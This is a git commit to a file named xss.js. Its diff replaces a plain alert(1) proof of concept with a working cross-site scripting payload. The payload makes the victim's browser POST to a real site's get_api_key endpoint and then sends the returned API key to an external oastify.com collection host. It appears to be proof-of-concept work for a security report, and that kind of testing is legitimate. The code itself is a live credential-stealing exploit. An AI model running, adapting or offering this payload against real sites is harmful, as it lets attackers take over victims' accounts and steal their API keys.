f411406e605aaa2c5f189cb1ab3902c0cc570b05
Tejas378 <64826070+Tejas378@users.noreply.github.com>
2024-08-16 19:44:35 +0530

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,9 @@
-alert(1)
+fetch("https://www.sav.com/users/get_api_key", { method: "POST",
+		  headers: {
+		    "Content-Type": "application/json",
+		  },
+		  body: JSON.stringify({}),
+		})
+		  .then((response) => response.json())  // parse JSON
+		  .then((data) => {console.log(data);fetch(`https://o7w127lvwybj87dqidv8vp2au10soh.oastify.com?victim_api_key=${JSON.stringify(data.api_key)}`)})    // log the parsed data
+		  .catch((error) => console.error('Error:', error)); 
